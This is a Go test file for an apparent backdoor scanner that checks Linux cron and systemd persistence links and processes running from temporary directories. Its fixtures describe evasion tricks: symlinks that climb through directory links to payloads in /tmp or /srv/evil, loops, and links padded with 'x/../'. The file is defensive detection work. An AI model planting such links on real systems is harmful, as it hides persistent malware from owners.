	if p == nil || p.Severity != model.SevBackdoor || !strings.Contains(p.Title, "40, 41 and 42") {
		t.Fatalf("proc finding: %+v", p)
	}
	if !strings.Contains(p.Fix, "cp /proc/40/exe") || !strings.Contains(p.Fix, "41") {
		t.Errorf("fix %q", p.Fix)
	}
	// Many pids: the title shows the first two and a count.
	for pid := 50; pid < 59; pid++ {
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: pid, UID: 1000, Exe: "/tmp/many", Comm: "worker"})
	}
	p = find(runOwned(c, owned), "heur.proc_exe:tmp:/tmp/many")
	if p == nil || !strings.Contains(p.Title, "50, 51 and 7 more (worker)") {
		t.Errorf("title: %+v", p)
	}
	// The key is the same on a second scan with different pids.
	c2 := cleanCollection()
	c2.Runtime.Processes = append(c2.Runtime.Processes, model.Process{PID: 900, UID: 1000, Exe: "/tmp/m", Comm: "m"})
	if find(runOwned(c2, owned), "heur.proc_exe:tmp:/tmp/m") == nil {
		t.Error("key changed with the pid")
	}
}

// The first real scan of a developer workstation: all four false alarms.
func TestDevWorkstationFixtureHasNoBackdoorSigns(t *testing.T) {
	start := time.Date(2026, 11, 1, 10, 0, 0, 0, time.UTC)
	c := cleanCollection()
	c.Accounts.Users[2].Home = "/home/alice"
	c.Persist = append(c.Persist,
		link("/etc/cron.daily/google-chrome", "/opt/google/chrome/cron/google-chrome"),
		link("/home/alice/.config/systemd/user/default.target.wants/a.service", "/home/alice/.config/systemd/user/a.service"),
		link("/home/alice/.config/systemd/user/default.target.wants/b.service", "/home/alice/.config/systemd/user/b.service"))
	for _, pid := range []int{99230, 743634, 7} {
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: pid, UID: 1000, Exe: "/usr/bin/node", Comm: "node", ExeDeleted: true, Started: start})
	}
	c.Files = append(c.Files, model.FileEntry{Path: "/usr/bin/node", Type: "file", Mode: 0o100755, CTime: start.Add(24 * time.Hour)},
		model.FileEntry{Path: "/opt/google/chrome/cron/google-chrome", Type: "file", Mode: 0o100755})
	for _, n := range []string{"a", "b"} {
		c.Persist = append(c.Persist, model.PersistFile{Path: "/home/alice/.config/systemd/user/" + n + ".service", Mode: 0o100644, Lines: []string{"ExecStart=/usr/bin/" + n}})
	}
	owned := cleanOwned()
	owned["/opt/google/chrome/cron/google-chrome"] = "google-chrome-stable"
	owned["/usr/bin/node"] = "nodejs"
	fs := runOwned(c, owned)
	got := map[string]model.Severity{}
	for _, f := range fs {
		if f.Severity == model.SevBackdoor {
			t.Errorf("backdoor sign: %s %s", f.Key, f.Title)
		}
		got[f.Key] = f.Severity
	}
	for _, k := range []string{
		"heur.persist_link_pkg:/etc/cron.daily/google-chrome",
		"heur.user_unit:/home/alice/.config/systemd/user/default.target.wants/a.service",
		"heur.user_unit:/home/alice/.config/systemd/user/default.target.wants/b.service",
		"heur.stale_exe:/usr/bin/node",
	} {
		if got[k] != model.SevNote {
			t.Errorf("missing note %s; got %v", k, keys(fs))
		}
	}
	if len(fs) != 4 {
		t.Errorf("want exactly 4 notes, got %v", keys(fs))
	}
}

func TestPackageLinkTargets(t *testing.T) {
	c := cleanCollection()
	c.Persist = append(c.Persist,
		link("/etc/cron.daily/a", "/opt/p/a"),
		link("/etc/cron.daily/b", "/opt/p/b"),
		link("/etc/cron.daily/c", "/opt/p/a"),
		link("/etc/cron.daily/d", "/usr/lib/d"))
	c.Files = append(c.Files, model.FileEntry{Path: "/opt/p/a", Type: "file", Mode: 0o100755})
	got := PackageLinkTargets(inventoried(c), map[string]string{"/opt/p/a": "p", "/usr/lib/d": "p"})
	if len(got) != 1 || got[0] != "/opt/p/a" {
		t.Errorf("got %v, want [/opt/p/a]", got)
	}
}

func TestUserUnitUncollectedAndHostileTargets(t *testing.T) {
	const l = "/home/alice/.config/systemd/user/default.target.wants/x.service"
	backdoor := func(name string, c *model.Collection) {
		t.Helper()
		fs := runOwned(c, cleanOwned())
		f := find(fs, "heur.persist_link:"+l)
		if f == nil || f.Severity != model.SevBackdoor || find(fs, "heur.user_unit:"+l) != nil {
			t.Errorf("%s: want a backdoor sign, got %v", name, keys(fs))
		}
	}
	// A unit in a tree whose contents are never collected has no note.
	c := userUnitCollection(l, "/home/alice/.config/systemd/user/x.service")
	c.Persist[len(c.Persist)-2].Lines = []string{"/home/alice/.local/share/systemd/user/evil.service"}
	c.Persist = c.Persist[:len(c.Persist)-1]
	backdoor("uncollected unit", c)
	// The link text was redacted: it is not what the link holds.
	c = userUnitCollection(l, "/home/alice/.config/systemd/user/x.service")
	for i := range c.Persist {
		if c.Persist[i].Path == l {
			c.Persist[i].Lines = []string{"/home/alice/.config/systemd/user/key=<redacted h:0011>/../../../../../../tmp/evil.service"}
			c.Persist[i].Redactions = 1
		}
	}
	backdoor("redacted user-unit link", c)
	c = cleanCollection()
	c.Persist = append(c.Persist, model.PersistFile{Path: "/etc/systemd/system/y.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/usr/key=<redacted h:0011>/../../tmp/evil"}, Redactions: 1})
	if f := find(runOwned(c, cleanOwned()), "heur.persist_link:/etc/systemd/system/y.service"); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("redacted system-prefix link: %+v", f)
	}
	// A home in a temporary tree is never "the same home".
	c = cleanCollection()
	c.Accounts.Users[2].Home = "/tmp/h"
	tl := "/tmp/h/.config/systemd/user/default.target.wants/x.service"
	c.Persist = append(c.Persist, link(tl, "/tmp/h/.config/systemd/user/x.service"),
		model.PersistFile{Path: "/tmp/h/.config/systemd/user/x.service", Mode: 0o100644, Lines: []string{"ExecStart=/tmp/x"}})
	fs := runOwned(c, cleanOwned())
	if f := find(fs, "heur.persist_link:"+tl); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("home in /tmp: %v", keys(fs))
	}
	// A system-wide user unit that was not collected is as before: no finding.
	c = userUnitCollection(l, "/usr/lib/systemd/user/x.service")
	c.Persist = c.Persist[:len(c.Persist)-1]
	if fs := runOwned(c, cleanOwned()); len(fs) != 0 {
		t.Errorf("uncollected /usr/lib target: %v", keys(fs))
	}
}

// Redactions counts secrets in the unit text that follows the target line; a
// clean target line is still resolved.
func TestLinkWithRedactedContentStillResolves(t *testing.T) {
	c := cleanCollection()
	p := link("/etc/systemd/system/z.service", "/usr/lib/systemd/system/z.service")
	p.Lines = append(p.Lines, "Environment=A=<redacted h:0011>")
	p.Redactions = 1
	c.Persist = append(c.Persist, p)
	if fs := runOwned(c, cleanOwned()); len(fs) != 0 {
		t.Errorf("findings: %v", keys(fs))
	}
}

// A link target is resolved exactly as the kernel reads it: a leading space
// makes it relative, pointing into the link's own directory.
func TestLinkTargetIsNotTrimmed(t *testing.T) {
	const l = "/home/alice/.config/systemd/user/default.target.wants/x.service"
	c := cleanCollection()
	c.Accounts.Users[2].Home = "/home/alice"
	c.Persist = append(c.Persist, link(l, " /usr/lib/systemd/user/x.service"))
	fs := runOwned(c, cleanOwned())
	f := find(fs, "heur.persist_link:"+l)
	if f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("leading-space target: %v", keys(fs))
	}
}

func TestPidListCapAndStableAfter(t *testing.T) {
	c := cleanCollection()
	for pid := 100; pid < 140; pid++ {
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: pid, UID: 1000, Exe: "/tmp/cap", Comm: "w"})
	}
	f := find(runOwned(c, cleanOwned()), "heur.proc_exe:tmp:/tmp/cap")
	if f == nil {
		t.Fatal("no finding")
	}
	if !strings.Contains(f.Fix, "120, and 19 more") || strings.Contains(f.Fix, "121") {
		t.Errorf("fix: %s", f.Fix)
	}
	if want := "runs from a temporary directory: /tmp/cap"; f.Evidence[0].After != want {
		t.Errorf("After %q, want %q", f.Evidence[0].After, want)
	}
}

// inventoried adds to a fixture what the collector records on a real machine:
// an entry for every directory on the way to each file and persistence file,
// and an entry for each persistence file itself. Links are resolved against
// these (model.ResolveInInventory).
func inventoried(c *model.Collection) *model.Collection {
	have := map[string]bool{}
	for _, f := range c.Files {
		have[f.Path] = true
	}
	add := func(e model.FileEntry) {
		if !have[e.Path] {
			have[e.Path] = true
			c.Files = append(c.Files, e)
		}
	}
	parents := func(p string) {
		for d := path.Dir(p); d != "/" && d != "."; d = path.Dir(d) {
			add(model.FileEntry{Path: d, Type: "dir", Mode: 0o40755})
		}
	}
	for _, f := range append([]model.FileEntry{}, c.Files...) {
		parents(f.Path)
	}
	for _, p := range c.Persist {
		parents(p.Path)
		// A link into a system directory leads to something that is there,
		// as on a real machine, unless the test names it "removed...".
		if t, ok := p.LinkTarget(); ok && !p.TargetRedacted() && !strings.HasPrefix(path.Base(t), "removed") {
			for _, d := range []string{"/usr/", "/lib/", "/etc/"} {
				if strings.HasPrefix(t, d) && !strings.Contains(p.Lines[0], "..") {
					parents(t)
					add(model.FileEntry{Path: t, Type: "file", Mode: 0o100644})
				}
			}
		}
		switch {
		case p.Mode&0o170000 == 0o120000 && len(p.Lines) > 0:
			add(model.FileEntry{Path: p.Path, Type: "symlink", Target: p.Lines[0], Mode: p.Mode})
		case p.Mode&0o170000 == 0o100000:
			add(model.FileEntry{Path: p.Path, Type: "file", Mode: p.Mode})
		}
	}
	return c
}

func symlinkEntry(p, target string) model.FileEntry {
	return model.FileEntry{Path: p, Type: "symlink", Target: target, Mode: 0o120777}
}

// A startup link is judged by the file the kernel opens for it, not by its
// text: "qdir/../file" with qdir a link elsewhere reads as the package's file
// and runs another.
func TestPersistLinkResolvedAsTheKernelDoes(t *testing.T) {
	const l, pkgFile = "/etc/cron.daily/vendor", "/opt/pkg/file"
	base := func(target string, extra ...model.FileEntry) (*model.Collection, map[string]string) {
		c := cleanCollection()
		c.Persist = append(c.Persist, link(l, target))
		c.Files = append(c.Files, model.FileEntry{Path: pkgFile, Type: "file", Mode: 0o100755})
		c.Files = append(c.Files, extra...)
		owned := cleanOwned()
		owned[pkgFile] = "vendor"
		return c, owned
	}
	backdoor := func(name string, c *model.Collection, owned map[string]string) {
		t.Helper()
		fs := runOwned(c, owned)
		if f := find(fs, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s: want a backdoor sign, got %v", name, keys(fs))
		}
		if got := PackageLinkTargets(inventoried(c), owned); len(got) != 0 {
			t.Errorf("%s: %v handed to package verification as the link's target", name, got)
		}
	}

	// Control: the plain link to the package's file is the R68 note.
	c, owned := base(pkgFile)
	if f := find(runOwned(c, owned), "heur.persist_link_pkg:"+l); f == nil || f.Severity != model.SevNote {
		t.Fatalf("plain package link: want the note")
	}
	// The directory link leads out of the inventory: /srv/evil/a/file runs.
	c, owned = base("/opt/pkg/qdir/../file", symlinkEntry("/opt/pkg/qdir", "/srv/evil/a/b"))
	backdoor("dot-dot through a directory link, target not inventoried", c, owned)
	// The same with everything in the inventory: the file that runs is
	// /srv/evil/a/file, which no package owns.
	c, owned = base("/opt/pkg/qdir/../file", symlinkEntry("/opt/pkg/qdir", "/srv/evil/a/b"),
		model.FileEntry{Path: "/srv/evil/a/b", Type: "dir", Mode: 0o40755}, model.FileEntry{Path: "/srv/evil/a/file", Type: "file", Mode: 0o100755})
	backdoor("dot-dot through a directory link, target inventoried", c, owned)
	if f := find(runOwned(c, owned), "heur.persist_link:"+l); f == nil || !strings.Contains(f.Title, "/srv/evil/a/file") {
		t.Errorf("the finding does not name the file that really runs: %+v", f)
	}
	// A relative target that climbs through a directory link.
	c, owned = base("../../opt/pkg/up/../file", symlinkEntry("/opt/pkg/up", "../../srv/evil/a/b"))
	backdoor("relative target through a relative directory link", c, owned)
	// A system-directory spelling that leaves the system directories.
	c, owned = base("/usr/lib/qdir/../x.sh", symlinkEntry("/usr/lib/qdir", "/var/tmp/q/b"))
	backdoor("system prefix by text only", c, owned)
	// A link loop and a chain longer than the hop limit.
	c, owned = base("/opt/pkg/a", symlinkEntry("/opt/pkg/a", "b"), symlinkEntry("/opt/pkg/b", "a"))
	backdoor("link loop", c, owned)
	// Something that only cleans to /dev/null is not a mask.
	c, owned = base("/opt/pkg/qdir/../../../dev/null", symlinkEntry("/opt/pkg/qdir", "/srv/evil/a/b"))
	backdoor("not a plain /dev/null", c, owned)

	// A link to a file that is there, in a system directory: quiet.
	c, owned = base("/lib/systemd/system/x.service")
	if fs := runOwned(c, owned); find(fs, "heur.persist_link:"+l) != nil || find(fs, "heur.persist_link_dangling:"+l) != nil {
		t.Errorf("link to an existing unit: reported %v", keys(fs))
	}
}

// What a link leads to when the file is not there, and when the way to it
// goes through /run.
func TestPersistLinkDanglingAndRun(t *testing.T) {
	const l = "/etc/systemd/system/multi-user.target.wants/x.service"
	dir := func(p string) model.FileEntry { return model.FileEntry{Path: p, Type: "dir", Mode: 0o40755} }
	reg := func(p string) model.FileEntry { return model.FileEntry{Path: p, Type: "file", Mode: 0o100644} }
	type want struct {
		key string
		sev model.Severity
	}
	quiet := want{}
	dangling := want{"heur.persist_link_dangling:" + l, model.SevNote}
	backdoor := want{"heur.persist_link:" + l, model.SevBackdoor}
	sysDirs := []model.FileEntry{dir("/usr"), dir("/usr/lib"), dir("/usr/lib/systemd"), dir("/usr/lib/systemd/system")}
	run := []model.FileEntry{dir("/run"), dir("/run/systemd"), dir("/run/systemd/system"), dir("/tmp")}
	// What the collector records when the walk stops at a network mount.
	nfs := []string{"/usr/lib/systemd/system"}
	for _, tc := range []struct {
		name    string
		target  string
		files   []model.FileEntry
		refused []string
		want    want
	}{
		// The enable link of a unit whose package was removed.
		{"file missing in a system directory", "/usr/lib/systemd/system/removed.service", sysDirs, nil, dangling},
		// A directory on the way is missing: nothing is known about where
		// this leads.
		{"directory missing on the way", "/usr/lib/removed-dir/removed.service", sysDirs, nil, backdoor},
		{"missing file outside the system directories", "/srv/app/removed.service", []model.FileEntry{dir("/srv"), dir("/srv/app")}, nil, backdoor},
		// "Missing" on a mount the scan stays out of is not known to be missing.
		{"missing on a network mount", "/usr/lib/systemd/system/removed.service", sysDirs, nfs, backdoor},
		// A link the collector did not follow to the end (past its work
		// budget, or cut off at the depth cap) is listed by its own path:
		// what seems missing was not looked for.
		{"link past the collector's budget", "/usr/lib/systemd/system/removed.service", sysDirs, []string{l}, backdoor},
		{"/run/systemd, link past the collector's budget", "/run/systemd/system/removed.service", run, []string{l}, backdoor},
		// /run/systemd counts only for a target that is really there.
		{"/run/systemd, existing file", "/run/systemd/system/x.service", append(run[:len(run):len(run)], reg("/run/systemd/system/x.service")), nil, quiet},
		{"/run/systemd, nothing recorded", "/run/systemd/system/x.service", nil, nil, backdoor},
		{"/run/systemd, file missing", "/run/systemd/system/removed.service", run, nil, dangling},
		// The reviewer's probe: /run/systemd/x is itself a link to a payload.
		{"/run/systemd link onward to /tmp", "/run/systemd/x",
			append(run[:len(run):len(run)], symlinkEntry("/run/systemd/x", "/tmp/payload"), reg("/tmp/payload")), nil, backdoor},
		{"/run/systemd link onward, payload not recorded", "/run/systemd/x",
			append(run[:len(run):len(run)], symlinkEntry("/run/systemd/x", "/tmp/payload")), nil, backdoor},
		// A tmpfs inside a system directory hides nothing either.
		{"link onward out of /etc", "/etc/x.d/job", []model.FileEntry{dir("/etc/x.d"), symlinkEntry("/etc/x.d/job", "/var/tmp/payload")}, nil, backdoor},
		{"climbing out past what was recorded", "../../../../srv/x/../../etc/removed.service", nil, nil, backdoor},
	} {
		c := cleanCollection()
		c.Persist = append(c.Persist, link(l, tc.target))
		c.Files = append(c.Files, tc.files...)
		c.LinkRefused = tc.refused
		fs := runOwned(c, cleanOwned())
		var got []string
		for _, f := range fs {
			if strings.HasSuffix(f.Key, ":"+l) {
				got = append(got, f.Key+" ("+f.Severity.String()+")")
			}
		}
		switch {
		case tc.want == quiet && len(got) != 0:
			t.Errorf("%s: want nothing, got %v", tc.name, got)
		case tc.want != quiet:
			if f := find(fs, tc.want.key); f == nil || f.Severity != tc.want.sev || len(got) != 1 {
				t.Errorf("%s: want %s (%s), got %v", tc.name, tc.want.key, tc.want.sev, got)
			}
		}
	}
}

// Ownership is by where a file is. With /opt a link to /data/opt, dpkg lists
// Chrome's cron script under /opt and the link opens it under /data/opt: it
// is still the package's file.
func TestPersistLinkPackageFileBehindALinkedDirectory(t *testing.T) {
	const l, lit, phys = "/etc/cron.daily/google-chrome", "/opt/google/chrome/cron/google-chrome", "/data/opt/google/chrome/cron/google-chrome"
	c := cleanCollection()
	c.Persist = append(c.Persist, link(l, lit))
	c.Files = append(c.Files, symlinkEntry("/opt", "/data/opt"),
		model.FileEntry{Path: phys, Type: "file", Mode: 0o100755},
		model.FileEntry{Path: lit, Type: "file", Mode: 0o100755}) // the entry recorded for the link's text
	inventoried(c)
	pk := model.Packages{Installed: []model.Package{{Name: "google-chrome-stable", Files: []string{lit}}}}
	_, literal := pk.PhysicalOwners(model.Inventory(c.Files))
	owned := pk.Owners()
	fs := Run(c, ctx, owned)
	if f := find(fs, "heur.persist_link_pkg:"+l); f == nil || f.Severity != model.SevNote {
		t.Fatalf("want the package-file note, got %v", keys(fs))
	}
	if got := PackageLinkTargets(c, owned); len(got) != 1 || got[0] != phys || literal[phys] != lit {
		t.Errorf("targets %v, dpkg spelling %q", got, literal[phys])
	}
	// The same link when /opt leads somewhere the package's file is not.
	c = cleanCollection()
	c.Persist = append(c.Persist, link(l, lit))
	c.Files = append(c.Files, symlinkEntry("/opt", "/var/tmp/opt"),
		model.FileEntry{Path: "/var/tmp/opt/google/chrome/cron/google-chrome", Type: "file", Mode: 0o100755})
	inventoried(c)
	fs = Run(c, ctx, pk.Owners())
	if f := find(fs, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("a package path that really lies in /var/tmp: want a backdoor sign, got %v", keys(fs))
	}
}

// A home whose ~/.config/systemd is a link into a dotfiles directory of the
// same home (GNU stow): the enabled unit is still the user's own.
func TestUserUnitInAStowManagedHome(t *testing.T) {
	const l = "/home/alice/.config/systemd/user/default.target.wants/x.service"
	stow := func(linkTo string) *model.Collection {
		c := userUnitCollection(l, "/home/alice/.config/systemd/user/x.service")
		for i := range c.Persist {
			if c.Persist[i].Path == l {
				c.Persist[i].Lines[0] = "../x.service"
			}
		}
		real := path.Clean(path.Join("/home/alice/.config", linkTo))
		c.Files = append(c.Files,
			symlinkEntry("/home/alice/.config/systemd", linkTo),
			model.FileEntry{Path: real + "/user/default.target.wants", Type: "dir", Mode: 0o40755},
			symlinkEntry(real+"/user/default.target.wants/x.service", "../x.service"),
			model.FileEntry{Path: real + "/user/x.service", Type: "file", Mode: 0o100644})
		return c
	}
	fs := runOwned(stow("../dotfiles/systemd/.config/systemd"), cleanOwned())
	if f := find(fs, "heur.user_unit:"+l); f == nil || f.Severity != model.SevNote {
		t.Errorf("stow home: want the user-unit note, got %v", keys(fs))
	}
	if find(fs, "heur.persist_link:"+l) != nil {
		t.Errorf("stow home: backdoor sign: %v", keys(fs))
	}
	// The same layout leading out of the home is not the user's own unit.
	fs = runOwned(stow("/var/tmp/q/systemd"), cleanOwned())
	if find(fs, "heur.user_unit:"+l) != nil {
		t.Errorf("unit directory outside the home: got the user-unit note: %v", keys(fs))
	}
	if f := find(fs, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("unit directory outside the home: want a backdoor sign, got %v", keys(fs))
	}
}

// The user-unit note needs the unit the link really enables to be the user's
// collected unit.
func TestUserUnitLinkResolvedAsTheKernelDoes(t *testing.T) {
	const l = "/home/alice/.config/systemd/user/default.target.wants/x.service"
	c := userUnitCollection(l, "/home/alice/.config/systemd/user/x.service")
	for i := range c.Persist {
		if c.Persist[i].Path == l {
			c.Persist[i].Lines[0] = "../qdir/../x.service"
		}
	}
	c.Files = append(c.Files, symlinkEntry("/home/alice/.config/systemd/user/qdir", "/var/tmp/q/b"))
	fs := runOwned(c, cleanOwned())
	if find(fs, "heur.user_unit:"+l) != nil {
		t.Errorf("a link that leaves the home through a directory link got the user-unit note: %v", keys(fs))
	}
	if f := find(fs, "heur.persist_link:"+l); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("want a backdoor sign, got %v", keys(fs))
	}
}

// Any user can plant startup links whose targets are 4 KB of "x/../" through
// a chain of such links. The collector cuts their walks off and lists them
// (Collection.LinkRefused); the heuristics do not walk them again. A
// collection without that record still costs no more than the cap on one
// walk, once per link.
func TestPaddedStartupLinksAreNotWalkedAgain(t *testing.T) {
	const home = "/home/alice"
	const wants = home + "/.config/systemd/user/default.target.wants"
	pad := strings.Repeat("x/../", 800)
	build := func() *model.Collection {
		c := cleanCollection()
		for _, d := range []string{"/home", home, home + "/x", home + "/.config", home + "/.config/systemd", home + "/.config/systemd/user", wants} {
			c.Files = append(c.Files, model.FileEntry{Path: d, Type: "dir", Mode: 0o40755})
		}
		for i := 1; i <= 7; i++ {
			next := fmt.Sprintf("L%d", i+1)
			if i == 7 {
				next = "end"
			}
			c.Files = append(c.Files, symlinkEntry(fmt.Sprintf("%s/L%d", home, i), pad+next))
		}
		c.Files = append(c.Files, model.FileEntry{Path: home + "/end", Type: "file", Mode: 0o100644})
		for i := 0; i < 2000; i++ {
			c.Persist = append(c.Persist, link(fmt.Sprintf("%s/u%d.service", wants, i), "../../../../"+pad[:len(pad)-25*5]+"L1"))
		}
		return c
	}
	check := func(name string, c *model.Collection, limit time.Duration) {
		start := time.Now()
		fs := Run(c, ctx, cleanOwned())
		if el := time.Since(start); el > limit {
			t.Errorf("%s: 2000 padded links took %v, limit %v", name, el, limit)
		}
		n := 0
		for _, f := range fs {
			if strings.HasPrefix(f.Key, "heur.persist_link:"+wants) && f.Severity == model.SevBackdoor {
				n++
			}
		}
		if n != 2000 {
			t.Errorf("%s: %d of 2000 links are backdoor signs", name, n)
		}
	}
	c := build()
	for _, p := range c.Persist {
		c.LinkRefused = append(c.LinkRefused, p.Path)
	}
	check("listed as cut off", c, 300*time.Millisecond)
	// Without the record each link is walked once, up to the cap. That is
	// bounded work; how long it takes depends on the machine running this.
	check("no record", build(), time.Minute)
}
